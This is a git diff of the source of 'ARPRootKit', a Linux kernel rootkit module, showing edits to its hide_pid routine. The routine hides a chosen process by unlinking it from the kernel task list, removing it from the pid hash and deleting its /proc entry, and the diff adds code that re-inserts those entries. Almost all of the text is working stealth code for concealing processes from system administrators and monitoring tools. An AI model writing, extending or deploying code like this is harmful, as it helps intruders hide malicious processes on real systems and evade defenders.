@@ -1,7 +1,7 @@
 /*
  * ARPRootKit v1.0, a simple rootkit for the Linux Kernel.
  * 
- * Copyright 2018 Abel Romero Pérez <abel@abelromero.com>
+ * Copyright 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -55,7 +55,7 @@ static int __init init_hello_4(void)
 
 	printk("pid_hash = %p, pidhash_shift = %d\n", pid_hash, pidhash_shift);
 
-	hide_pid(9);
+	hide_pid(10);
 
 	return 0;
 }
@@ -89,12 +89,12 @@ int hide_pid(pid_t nr) {
 				if (pnr->nr == nr && pnr->ns == ns)
             		return container_of(pnr, struct pid, numbers[ns->level]);
 */
+			struct hlist_head *head;
 			struct hlist_node *node;
-			for (node = hlist_first_rcu(&pid_hash[pid_hashfn(nr, ns)]), pnr = hlist_entry_safe(rcu_dereference_raw(hlist_first_rcu(&pid_hash[pid_hashfn(nr, ns)])), typeof(*(pnr)), pid_chain);
-				pnr;
-				node = hlist_next_rcu(&(pnr)->pid_chain), pnr = hlist_entry_safe(rcu_dereference_raw(hlist_next_rcu(&(pnr)->pid_chain)), typeof(*(pnr)), pid_chain))
-//			 hlist_for_each_entry_rcu(pnr, &pid_hash[pid_hashfn(nr, ns)], pid_chain)
-			{
+			head = &pid_hash[pid_hashfn(nr, ns)];
+			node = hlist_first_rcu(head);
+			pnr = hlist_entry_safe(rcu_dereference_raw(node), typeof(*(pnr)), pid_chain);
+			if (pnr) {
 				printk("%d\n", pnr->nr);
 				if (pnr->nr == nr && pnr->ns == ns) {
 					printk("found pid %d\n", nr);
@@ -102,18 +102,24 @@ int hide_pid(pid_t nr) {
 					struct task_struct *task = get_pid_task(pid, PIDTYPE_PID);
 					if (task != NULL) {
 						printk("task = %p\n", task);
+						struct list_head *task_next, *task_prev;
+						task_prev = task->tasks.next->prev;
+						task_next = task->tasks.prev->next;
 						task->tasks.next->prev = task->tasks.prev;
 			            task->tasks.prev->next = task->tasks.next;
 						hlist_del_rcu(node);
-						printk("find_vpid %p\n", find_vpid(nr));
 						char path_name[50];
 						snprintf(path_name, sizeof(path_name), "/proc/%d", nr);
-					    struct inode *inode;
-					    struct path path;
-					    kern_path(path_name, LOOKUP_FOLLOW, &path);
+						struct path path;
+						kern_path(path_name, LOOKUP_FOLLOW, &path);
 						d_delete(path.dentry);
-					    //inode = path.dentry->d_inode;
-						//printk("inode = %p\n", inode);
+						d_rehash(path.dentry);
+						hlist_add_head_rcu(node, &pid_hash[pid_hashfn(nr, ns)]);
+						task->tasks.next->prev = task_prev;
+						task->tasks.prev->next = task_next;
+
+						printk("find_vpid %p\n", find_vpid(nr));
+						
 						return 0;
 					}
 				}
